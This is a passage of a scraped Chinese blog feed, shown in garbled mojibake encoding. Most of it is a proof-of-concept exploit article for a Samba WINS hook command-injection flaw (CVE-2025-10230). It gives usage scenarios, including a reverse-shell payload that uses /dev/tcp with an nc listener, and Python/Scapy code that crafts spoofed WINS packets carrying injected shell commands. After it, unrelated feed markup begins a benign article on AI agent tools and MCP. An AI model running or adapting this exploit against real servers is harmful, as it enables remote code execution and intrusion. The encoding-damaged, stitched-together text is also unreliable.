<h5 data-id="heading-15">åœºæ™¯1ï¼šå¿«é€Ÿæ¼æ´éªŒè¯</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨é»˜è®¤è½½è·éªŒè¯æ¼æ´</span>
sudo python3 CVE-2025-10230.py 192.168.1.100
<span class="hljs-comment"># åœ¨ç›®æ ‡æœåŠ¡å™¨æ£€æŸ¥æ–‡ä»¶</span>
ssh admin@192.168.1.100 <span class="hljs-string">"cat /tmp/injected_by_cve.txt"</span>
</code></pre>
<h5 data-id="heading-16">åœºæ™¯2ï¼šè‡ªå®šä¹‰åå‘shell</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è®¾ç½®ç›‘å¬å™¨</span>
nc -lvnp 4444

<span class="hljs-comment"># å‘é€åå‘shellè½½è·</span>
sudo python3 CVE-2025-10230.py 192.168.1.100 \
  --payload <span class="hljs-string">"; bash -i &gt;&amp; /dev/tcp/192.168.1.50/4444 0&gt;&amp;1"</span>
</code></pre>
<h5 data-id="heading-17">åœºæ™¯3ï¼šä¿¡æ¯æ”¶é›†</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”¶é›†ç³»ç»Ÿä¿¡æ¯</span>
sudo python3 CVE-2025-10230.py 192.168.1.100 \
  --payload <span class="hljs-string">"; uname -a &gt; /tmp/sysinfo.txt &amp;&amp; \
             whoami &gt;&gt; /tmp/sysinfo.txt"</span>
</code></pre>
<h4 data-id="heading-18">APIæ¦‚è§ˆ</h4>
<p>è„šæœ¬é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æä¾›ä»¥ä¸‹åŠŸèƒ½æ¥å£ï¼š</p>



































<table><thead><tr><th>å‚æ•°</th><th>ç¼©å†™</th><th>æè¿°</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td><code>target_ip</code></td><td>-</td><td>ç›®æ ‡SambaæœåŠ¡å™¨IPåœ°å€</td><td>å¿…éœ€</td></tr><tr><td><code>--payload</code></td><td>-</td><td>è¦æ³¨å…¥çš„shellå‘½ä»¤</td><td><code>; id &gt; /tmp/injected_by_cve.txt 2&gt;&amp;1</code></td></tr><tr><td><code>--src_ip</code></td><td>-</td><td>ä¼ªé€ çš„æºIPåœ°å€</td><td><code>192.168.1.100</code></td></tr><tr><td><code>--verbose</code></td><td><code>-v</code></td><td>å¯ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼</td><td><code>False</code></td></tr></tbody></table>
<h3 data-id="heading-19">æ ¸å¿ƒä»£ç </h3>
<h4 data-id="heading-20">1. ä¸»å‡½æ•°å…¥å£ç‚¹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    parser = argparse.ArgumentParser(description=<span class="hljs-string">"CVE-2025-10230 PoC - Samba WINS Injection"</span>)
    parser.add_argument(<span class="hljs-string">"target_ip"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"IP of vulnerable Samba AD DC"</span>)
    parser.add_argument(<span class="hljs-string">"--payload"</span>, default=<span class="hljs-string">"; id &gt; /tmp/injected_by_cve.txt 2&gt;&amp;1"</span>, 
                        <span class="hljs-built_in">help</span>=<span class="hljs-string">"Shell command to inject (appended after fake NB name)"</span>)
    parser.add_argument(<span class="hljs-string">"--src_ip"</span>, default=<span class="hljs-string">"192.168.1.100"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"Spoofed source IP in packet"</span>)
    parser.add_argument(<span class="hljs-string">"--verbose"</span>, <span class="hljs-string">"-v"</span>, action=<span class="hljs-string">"store_true"</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">"Verbose Scapy output"</span>)
    args = parser.parse_args()
    
    <span class="hljs-comment"># æ„é€ æ¶æ„NetBIOSåç§°ï¼šåˆæ³•å‰ç¼€ + è½½è·</span>
    fake_nb = <span class="hljs-string">"POC-"</span>  <span class="hljs-comment"># çœ‹èµ·æ¥åˆæ³•çš„å‰ç¼€</span>
    malicious_name = fake_nb + args.payload[:<span class="hljs-number">10</span>]  <span class="hljs-comment"># æˆªæ–­ä»¥é€‚åº”~15å­—ç¬¦é™åˆ¶</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ”¥ CVE-2025-10230 PoC Launching..."</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ¯ Target: <span class="hljs-subst">{args.target_ip}</span> (UDP/42 - WINS)"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ’‰ Malicious NB Name: '<span class="hljs-subst">{malicious_name}</span>'"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ“ Expected on Target: Execution of '<span class="hljs-subst">{args.payload}</span>' via hook script"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ•µï¸  Post-exploit: Check target /tmp/injected_by_cve.txt or /var/log/samba/log.smbd"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">60</span>)
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># æ„é€ å¹¶å‘é€æ¶æ„æ•°æ®åŒ…</span>
        pkt = craft_wins_registration_packet(malicious_name, args.src_ip, args.target_ip)
        send(pkt, verbose=args.verbose, iface=<span class="hljs-string">"eth0"</span>)  <span class="hljs-comment"># å¯èƒ½éœ€è¦è°ƒæ•´æ¥å£</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ’¥ Packet sent! If vulnerable, hook should fire. Monitor target logs/FS. ğŸš¨"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"âŒ Error sending packet: <span class="hljs-subst">{e}</span>"</span>)
        sys.exit(<span class="hljs-number">1</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"Usage: sudo python3 CVE-2025-10230.py &lt;target_ip&gt; [--payload ';cmd']"</span>)
        sys.exit(<span class="hljs-number">1</span>)
    main()
</code></pre>
<h4 data-id="heading-21">2. WINSæ•°æ®åŒ…æ„é€ å‡½æ•°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">craft_wins_registration_packet</span>(<span class="hljs-params">nb_name: <span class="hljs-built_in">str</span>, src_ip: <span class="hljs-built_in">str</span> = <span class="hljs-string">"127.0.0.1"</span>, target_ip: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span></span>):
    <span class="hljs-string">"""
    æ„é€ åŒ…å«æ³¨å…¥NBåç§°çš„WINSåç§°æ³¨å†Œè¯·æ±‚æ•°æ®åŒ…ã€‚
    
    WINSåè®®ï¼ˆç¬¦åˆRFC 1002æ ‡å‡†ï¼Œä¸ºæ³¨å†Œç®€åŒ–ï¼‰ã€‚
    OpCode: 0x0Bï¼ˆæ³¨å†Œï¼‰
    NBåç§°ï¼šå¡«å……åˆ°15å­—ç¬¦+ç©ºå€¼ï¼Œä½†é€šè¿‡å°¾éšå…ƒå­—ç¬¦æ³¨å…¥ã€‚
    
    å‚æ•°ï¼š
        nb_name: è¦æ³¨å…¥çš„NetBIOSåç§°ï¼ˆåŒ…å«æ¶æ„å‘½ä»¤ï¼‰
        src_ip: ä¼ªé€ çš„æºIPåœ°å€
        target_ip: ç›®æ ‡SambaæœåŠ¡å™¨IPåœ°å€
    
    è¿”å›ï¼š
        å®Œæ•´çš„Scapyæ•°æ®åŒ…å¯¹è±¡
    """</span>
    <span class="hljs-comment"># äº‹åŠ¡IDï¼ˆä»»æ„å€¼ï¼‰</span>
    transaction_id = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x1234</span>)
    
    <span class="hljs-comment"># æ ‡å¿—ä½ï¼šæ ‡å‡†æŸ¥è¯¢(0x0000)ï¼ŒOpCodeæ³¨å†Œ(0x0Båœ¨é«˜ä½ï¼Œä½†ç®€åŒ–å¤„ç†)</span>
    flags = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x000B</span>)  <span class="hljs-comment"># BèŠ‚ç‚¹ï¼Œæ³¨å†Œ</span>
    
    <span class="hljs-comment"># é—®é¢˜æ•°ï¼š1</span>
    questions = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># åº”ç­”RRæ•°ï¼š0</span>
    answer_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># æƒå¨RRæ•°ï¼š0</span>
    authority_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># é™„åŠ RRæ•°ï¼š0</span>
    additional_rrs = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0</span>)
    
    <span class="hljs-comment"># å¤´éƒ¨ç»„è£…</span>
    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    
    <span class="hljs-comment"># é—®é¢˜éƒ¨åˆ†ï¼šNetBIOSåç§°</span>
    <span class="hljs-comment"># NBåç§°ç¼–ç ï¼š18ä¸ª0xC0å­—ç¬¦ï¼ˆæ ‡ç­¾ï¼‰+ é•¿åº¦ + åç§°å­—ç¬¦</span>
    <span class="hljs-comment"># é’ˆå¯¹æ¼æ´ï¼šä½¿ç”¨åŒ…å«shellå­—ç¬¦çš„åŸå§‹å­—ç¬¦ä¸² - æ¼æ´ä¸ä¼šéªŒè¯</span>
    nb_raw = nb_name.encode(<span class="hljs-string">'ascii'</span>)[:<span class="hljs-number">15</span>].ljust(<span class="hljs-number">15</span>, <span class="hljs-string">b'\x00'</span>)  <span class="hljs-comment"># æˆªæ–­/å¡«å……åˆ°15å­—ç¬¦</span>
    nb_section = <span class="hljs-string">b'\xC0'</span> * <span class="hljs-number">2</span> + struct.pack(<span class="hljs-string">'B'</span>, <span class="hljs-built_in">len</span>(nb_raw)) + nb_raw + <span class="hljs-string">b'\x00'</span>  <span class="hljs-comment"># å‹ç¼©æŒ‡é’ˆæŠ€å·§ + åç§°</span>
    
    <span class="hljs-comment"># QType: NB (0x0020), QClass: IN (0x0001)</span>
    qtype = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x0020</span>)
    qclass = struct.pack(<span class="hljs-string">'&gt;H'</span>, <span class="hljs-number">0x0001</span>)
    
    <span class="hljs-comment"># é—®é¢˜éƒ¨åˆ†ç»„è£…</span>
    question = nb_section + qtype + qclass
    
    <span class="hljs-comment"># æ³¨å†Œè¯·æ±‚æ²¡æœ‰åº”ç­”éƒ¨åˆ†</span>
    packet_payload = header + question
    
    <span class="hljs-comment"># åŒ…è£…åˆ°UDP/IPå±‚</span>
    ip_layer = IP_scapy(src=src_ip, dst=target_ip)
    udp_layer = UDP(sport=<span class="hljs-number">137</span>, dport=<span class="hljs-number">42</span>)  <span class="hljs-comment"># NBNSæºç«¯å£ï¼ŒWINSç›®æ ‡ç«¯å£ï¼ˆUDP/42ä¸ºWINSç«¯å£ï¼‰</span>
    full_packet = ip_layer / udp_layer / Raw(load=packet_payload)
    
    <span class="hljs-keyword">return</span> full_packet
</code></pre>
<h4 data-id="heading-22">3. æ¼æ´åˆ©ç”¨é€»è¾‘</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åœ¨mainå‡½æ•°ä¸­çš„å…³é”®éƒ¨åˆ†ï¼š</span>
<span class="hljs-comment"># æ„é€ æ¶æ„NetBIOSåç§°ï¼šåˆæ³•å‰ç¼€ + è½½è·</span>
fake_nb = <span class="hljs-string">"POC-"</span>  <span class="hljs-comment"># çœ‹èµ·æ¥åˆæ³•çš„å‰ç¼€</span>
malicious_name = fake_nb + args.payload[:<span class="hljs-number">10</span>]  <span class="hljs-comment"># æˆªæ–­ä»¥é€‚åº”~15å­—ç¬¦é™åˆ¶</span>

<span class="hljs-comment"># æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒåœ¨äºï¼š</span>
<span class="hljs-comment"># 1. WINSé’©å­è„šæœ¬ä¼šæ¥æ”¶NetBIOSåç§°ä½œä¸ºå‚æ•°</span>
<span class="hljs-comment"># 2. åç§°ç›´æ¥ä¼ é€’ç»™ç³»ç»Ÿshellè€Œæ²¡æœ‰é€‚å½“æ¸…ç†</span>
<span class="hljs-comment"># 3. åˆ†å·ç­‰shellå…ƒå­—ç¬¦å…è®¸æ‰§è¡Œä»»æ„å‘½ä»¤</span>

<span class="hljs-comment"># æ”»å‡»æ•°æ®åŒ…å‘é€</span>
pkt = craft_wins_registration_packet(malicious_name, args.src_ip, args.target_ip)
send(pkt, verbose=args.verbose, iface=<span class="hljs-string">"eth0"</span>)
</code></pre>
<h4 data-id="heading-23">4. ç¨‹åºå¤´éƒ¨æ³¨é‡Šå’Œè¯´æ˜</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-string">"""
PoC for CVE-2025-10230 - Samba WINS Hook Command Injection
===========================================================

æ­¤è„šæœ¬æ¼”ç¤ºäº†åœ¨Sambaçš„WINSé’©å­å¤„ç†ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œ
å½“Sambaä½œä¸ºADåŸŸæ§åˆ¶å™¨è¿è¡Œå¹¶å¯ç”¨WINSæ”¯æŒæ—¶ã€‚

ç”¨æ³•ï¼š
    python3 CVE-2025-10230.py &lt;target_ip&gt; [--payload &lt;cmd&gt;] [--verbose]

è¦æ±‚ï¼š
    - scapy (pip install scapy)
    - ä»¥root/sudoæƒé™è¿è¡Œä»¥è·å¾—åŸå§‹å¥—æ¥å­—è®¿é—®

æ¼æ´è¯¦æƒ…ï¼š
    WINSæ³¨å†Œä¸­çš„æœªæ¸…ç†NetBIOSåç§°è¢«ä¼ é€’ç»™'wins hook'è„šæœ¬ï¼Œ
    å…è®¸é€šè¿‡shellå…ƒå­—ç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚

ä½œè€…ï¼šdptsecï¼ˆåŸºäºSambaå®‰å…¨å…¬å‘Šï¼‰
è®¸å¯è¯ï¼šä»…ç”¨äºæ•™è‚²/æµ‹è¯•ç›®çš„ã€‚
âš ï¸  è¯·å‹¿åœ¨ç”Ÿäº§ç³»ç»Ÿä¸Šä½¿ç”¨ï¼
"""</span>
</code></pre>
<p>è¿™äº›æ ¸å¿ƒä»£ç å±•ç¤ºäº†å®Œæ•´çš„æ¼æ´åˆ©ç”¨é“¾ï¼Œä»æ•°æ®åŒ…æ„é€ åˆ°å®é™…æ”»å‡»æ‰§è¡Œçš„å®Œæ•´æµç¨‹ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œæ³¨é‡Šè¯¦ç»†ï¼Œä¾¿äºç†è§£å’Œä¿®æ”¹ç”¨äºåˆæ³•çš„å®‰å…¨æµ‹è¯•ç›®çš„ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcANeiTtN5BtCTpfUQ44YS8cf</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Š5-Day AI Agents Intensiveã€‹- Agent Tools & MCP]]></title>    <link>https://juejin.cn/post/7590021144779243566</link>    <guid>https://juejin.cn/post/7590021144779243566</guid>    <pubDate>2026-01-02T03:32:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590021144779243566" data-draft-id="7590503651115515954" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Š5-Day AI Agents Intensiveã€‹- Agent Tools &amp; MCP"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Agent,MCP"/> <meta itemprop="datePublished" content="2026-01-02T03:32:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å»ç å¤´æ•´ç‚¹è–¯ç‰‡"/> <meta itemprop="url" content="https://juejin.cn/user/3104676568631917"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Š5-Day AI Agents Intensiveã€‹- Agent Tools &amp; MCP
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3104676568631917/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å»ç å¤´æ•´ç‚¹è–¯ç‰‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:32:17.000Z" title="Fri Jan 02 2026 03:32:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fwhitepaper-agent-tools-and-interoperability-with-mcp" target="_blank" title="https://www.kaggle.com/whitepaper-agent-tools-and-interoperability-with-mcp" ref="nofollow noopener noreferrer">Agent Tools &amp;Â InteroperabilityÂ with MCP</a></p>
<blockquote>
<p>å…¨æ–‡ä¸ºæ•´ä½“å¤§çº²ï¼Œç»†èŠ‚éƒ¨åˆ†çœ‹è§†é¢‘</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€é—®é¢˜èƒŒæ™¯ï¼šä»â€œä¼šæ€è€ƒçš„æ¨¡å‹â€åˆ°â€œèƒ½è¡ŒåŠ¨çš„ç³»ç»Ÿâ€</h2>
<p>å½“å‰ï¼Œä»»ä½•ä»äº‹ AI åº”ç”¨å¼€å‘çš„äººéƒ½ä¼šé¢ä¸´ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š<strong>å¦‚ä½•è®©é«˜åº¦æ™ºèƒ½çš„è¯­è¨€æ¨¡å‹åœ¨çœŸå®ä¸–ç•Œä¸­äº§ç”Ÿå¯æ‰§è¡Œã€å¯éªŒè¯çš„ä»·å€¼ï¼Ÿ</strong></p>
<p>å°½ç®¡åŸºç¡€æ¨¡å‹ï¼ˆFoundation Modelsï¼‰åœ¨è¯­è¨€ç†è§£ä¸ç”Ÿæˆæ–¹é¢è¡¨ç°å“è¶Šï¼Œä½†å…¶èƒ½åŠ›æœ¬è´¨ä¸Šä»å—é™äºè®­ç»ƒæ•°æ®æœ¬èº«ã€‚æ¨¡å‹æ— æ³•ä¸»åŠ¨æ„ŸçŸ¥å®æ—¶ä¿¡æ¯ï¼Œä¹Ÿæ— æ³•ç›´æ¥å¯¹å¤–éƒ¨ç³»ç»Ÿæ–½åŠ å½±å“ã€‚</p>
<p>ä»å·¥ç¨‹è§’åº¦çœ‹ï¼Œè¯­è¨€æ¨¡å‹æ›´åƒæ˜¯ä¸€ä¸ªé«˜åº¦ç²¾ç¡®çš„æ¨¡å¼åŒ¹é…ä¸æ¨ç†å¼•æ“ï¼Œå´ç¼ºä¹ä¸ç°å®ä¸–ç•Œäº¤äº’çš„â€œæ„Ÿå®˜â€å’Œâ€œæ‰§è¡Œå™¨â€ã€‚å®ƒå¯ä»¥ç”Ÿæˆä»£ç ã€æ’°å†™æ–‡æœ¬ï¼Œå´æ— æ³•è‡ªè¡Œè°ƒç”¨ APIã€æŸ¥è¯¢å®æ—¶è‚¡ä»·ï¼Œæˆ–è§¦å‘ä¸€å°é‚®ä»¶çš„å‘é€ã€‚</p>
<p>æ­£æ˜¯è¿™ç§æ„ŸçŸ¥ä¸è¡ŒåŠ¨èƒ½åŠ›çš„ç¼ºå¤±ï¼Œæ„æˆäº† Agentic AI è¯•å›¾è§£å†³çš„å…³é”®é—®é¢˜ï¼Œä¹Ÿä½¿å…¶åœ¨ä¼ä¸šçº§åº”ç”¨åœºæ™¯ä¸­å…·å¤‡æ½œåœ¨çš„é¢ è¦†æ€§ä»·å€¼ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å·¥å…·ï¼ˆToolsï¼‰ï¼šAgent çš„æ„Ÿå®˜ä¸æ‰§è¡Œæœºåˆ¶</h2>
<h3 data-id="heading-2">2.1 å·¥å…·çš„å®šä¹‰</h3>
<p>åœ¨ Agent ä½“ç³»ä¸­ï¼Œå·¥å…·ï¼ˆToolï¼‰æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå‡½æ•°æˆ–ç¨‹åºï¼Œç”¨äºå¼¥è¡¥è¯­è¨€æ¨¡å‹çš„èƒ½åŠ›è¾¹ç•Œï¼Œä½¿å…¶èƒ½å¤Ÿå®Œæˆæ¨¡å‹æœ¬èº«æ— æ³•åŸç”Ÿå®Œæˆçš„ä»»åŠ¡ã€‚è¿™äº›ä»»åŠ¡å¯ä»¥å½’çº³ä¸ºä¸¤ç±»ï¼š</p>
<ol start="0">
<li>è·å–æ–°ä¿¡æ¯ï¼ˆKnow Somethingï¼‰ ä¾‹å¦‚ï¼šè°ƒç”¨ API è·å–å®æ—¶å¤©æ°”ã€æŸ¥è¯¢å½“å‰è‚¡ç¥¨ä»·æ ¼ç­‰ã€‚</li>
<li>æ‰§è¡Œå¤–éƒ¨åŠ¨ä½œï¼ˆDo Somethingï¼‰ ä¾‹å¦‚ï¼šå‘é€æ¶ˆæ¯ã€æ›´æ–°æ•°æ®åº“ã€åˆ›å»ºå·¥å•ã€é¢„è®¢èµ„æºç­‰ã€‚</li>
</ol>
<h3 data-id="heading-3">2.2 å·¥å…·çš„ä¸‰ç§ä¸»è¦ç±»å‹</h3>
<p>æ ¹æ®ç™½çš®ä¹¦ä¸­çš„åˆ†ç±»ï¼Œå·¥å…·ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ã€‚</p>
<h4 data-id="heading-4">ï¼ˆ1ï¼‰å‡½æ•°å·¥å…·ï¼ˆFunction Toolsï¼‰</h4>
<p>å‡½æ•°å·¥å…·ç”±å¼€å‘è€…æ˜¾å¼å®šä¹‰ï¼Œé€šå¸¸æ˜¯å¤–éƒ¨å‡½æ•°ï¼ˆå¦‚ Python æ–¹æ³•ï¼‰ã€‚åœ¨è¯¸å¦‚ Google ADK ç­‰æ¡†æ¶ä¸­ï¼Œå‡½æ•°å·¥å…·é€šå¸¸ä¾èµ–è¯¦ç»†çš„æ–‡æ¡£å­—ç¬¦ä¸²ï¼ˆdocstringï¼‰æ¥å®šä¹‰å…¶æ¥å£å¥‘çº¦ï¼ŒåŒ…æ‹¬è¾“å…¥å‚æ•°ã€è¾“å‡ºç»“æ„ä¸è¯­ä¹‰è¯´æ˜ã€‚</p>
<p>æ¨¡å‹é€šè¿‡è¯»å–è¿™äº›æ–‡æ¡£ä¿¡æ¯ï¼Œç†è§£å¦‚ä½•æ­£ç¡®è°ƒç”¨è¯¥å‡½æ•°ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>å‡½æ•°ï¼š<code>set_light_values</code></li>
<li>æ–‡æ¡£æè¿°ï¼šæŒ‡å®šäº®åº¦ä¸é¢œè‰²å‚æ•°ï¼Œç”¨äºæ§åˆ¶æ™ºèƒ½å®¶å±…ç¯å…‰</li>
</ul>
<p>æ–‡æ¡£å³å¥‘çº¦ï¼Œæ˜¯æ¨¡å‹ç†è§£å·¥å…·èƒ½åŠ›çš„å”¯ä¸€ä¾æ®ã€‚</p>
<h4 data-id="heading-5">ï¼ˆ2ï¼‰å†…ç½®å·¥å…·ï¼ˆBuilt-in Toolsï¼‰</h4>
